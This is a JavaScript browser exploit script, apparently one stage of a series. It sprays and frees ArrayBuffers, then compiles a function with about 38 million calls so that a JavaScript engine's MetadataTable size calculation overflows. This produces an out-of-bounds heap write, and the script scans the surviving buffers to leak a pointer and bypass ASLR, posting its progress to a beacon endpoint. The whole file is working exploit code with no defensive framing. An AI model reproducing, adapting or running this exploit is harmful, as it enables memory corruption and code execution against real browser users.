// p160 — Lean MetadataTable overflow: compile + scan, no call, no Worker
// V157 crashed because Worker called the function (OOB metadata READ → garbage call target → SIGSEGV)
// V158 never ran. p160: compile only (finishCreation writes OOB), scan spray for thunk addr
// Beacon prefix: V160-
(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V160-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hexU32(arr, off) {
    var s = '';
    for (var i = 3; i >= 0; i--) s += hexByte(arr[off + i]);
    return s;
  }
  function hexU64(arr, off) {
    return hexU32(arr, off + 4) + hexU32(arr, off);
  }

  B('BOOT');

  // Phase 1: Spray 400 ArrayBuffers at MetadataTable allocation size
  // MetadataTable alloc = sizeof(LinkingData) + totalSize = 16 + 100096 = 100112 bytes
  var BUF_SZ = 100112;
  var SPRAY_N = 400;
  var bufs = new Array(SPRAY_N);
  for (var i = 0; i < SPRAY_N; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  B('SPRAY-' + SPRAY_N);

  // Phase 2: Free even-indexed via structuredClone transfer
  // This neutering detaches backing stores — avoids conservative GC pinning
  var freed = 0;
  for (var i = 0; i < SPRAY_N; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      freed++;
    } catch(e) {
      if (freed === 0) { B('XFER-ERR-' + e.message.substring(0, 40)); return; }
    }
    bufs[i] = null;
  }
  B('FREED-' + freed);

  // Phase 3: Create views on surviving (odd-indexed) buffers
  var views = [];
  for (var i = 1; i < SPRAY_N; i += 2) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      views.push(new Uint8Array(bufs[i]));
    }
  }
  B('VIEWS-' + views.length);
  bufs = null;

  // Phase 4: GC to collect ephemeral clone cells and free backing stores
  setTimeout(function() {
    for (var g = 0; g < 10; g++) {
      var junk = [];
      for (var j = 0; j < 50000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC-DONE');

    // Phase 5: Build function with 38M op_call instructions
    // Each op_call generates 112 bytes of metadata
    // Total: 38,348,816 x 112 = 4,295,067,392 → wraps to 100,096 (totalSize)
    // link() allocates 100,112 bytes → finishCreation sweeps 4.3GB forward
    var N = 38348816;
    var CHUNK = 4000000;
    var nChunks = Math.floor(N / CHUNK);
    var rem = N - nChunks * CHUNK;
    var callStr = 'a();'.repeat(CHUNK);
    var parts = [];
    parts.push('window.__p160fn=function(a){');
    for (var c = 0; c < nChunks; c++) parts.push(callStr);
    if (rem > 0) parts.push('a();'.repeat(rem));
    parts.push('};window.__p160ok=1;');
    callStr = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    // Compile on main thread via <script> tag
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p160ok ? 'OK' : 'FAIL'));

      // Phase 6: Scan surviving buffers for sweep corruption
      // finishCreation writes to metadata entries at 112-byte stride
      // Per entry at offset from entry base:
      //   +12: m_slowPathCount = 0xFFFFFFFF
      //   +24: m_slowPathCallDestination = thunk ptr (ASLR leak)
      //   +68: m_bytecodeIndex = sequential instruction index
      var hits = 0;
      var thunk = '';

      for (var vi = 0; vi < views.length; vi++) {
        var v = views[vi];
        // Scan for 0xFFFFFFFF at offset 12 within 112-byte entries
        for (var off = 12; off < v.length - 100; off += 112) {
          if (v[off] === 0xFF && v[off+1] === 0xFF && v[off+2] === 0xFF && v[off+3] === 0xFF) {
            hits++;
            if (hits <= 3) {
              var thunkOff = off + 12; // entry_base+24 = m_slowPathCallDestination
              thunk = hexU64(v, thunkOff);
              var bIdx = hexU32(v, off + 56); // entry_base+68 = m_bytecodeIndex
              B('HIT-B' + vi + '-OFF' + off + '-THUNK-' + thunk + '-IDX-' + bIdx);
            }
          }
        }

        // Also scan with 1-byte granularity in case alignment differs
        if (hits === 0 && vi < 5) {
          for (var off = 0; off < v.length - 15; off += 4) {
            if (v[off] === 0xFF && v[off+1] === 0xFF && v[off+2] === 0xFF && v[off+3] === 0xFF) {
              var ctx = '';
              for (var c = Math.max(0, off - 4); c < Math.min(v.length, off + 16); c++) {
                ctx += hexByte(v[c]);
              }
              B('RAW-B' + vi + '-OFF' + off + '-CTX-' + ctx);
              if (++hits >= 3) break;
            }
          }
        }
      }

      if (hits === 0) {
        // Check if ANY byte was modified in ANY view (sweep missed all buffers)
        var anyMod = false;
        for (var vi = 0; vi < views.length && !anyMod; vi++) {
          var v = views[vi];
          for (var off = 0; off < v.length; off += 64) {
            if (v[off] !== 0) { anyMod = true; break; }
          }
        }
        B('MISS-' + views.length + '-ANYMOD-' + (anyMod ? 'YES' : 'NO'));
      } else {
        B('TOTAL-HITS-' + hits);
        if (thunk && thunk !== '0000000000000000') {
          B('ASLR-LEAK-' + thunk);
        }
      }
      B('DONE');
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }, 500);
})();
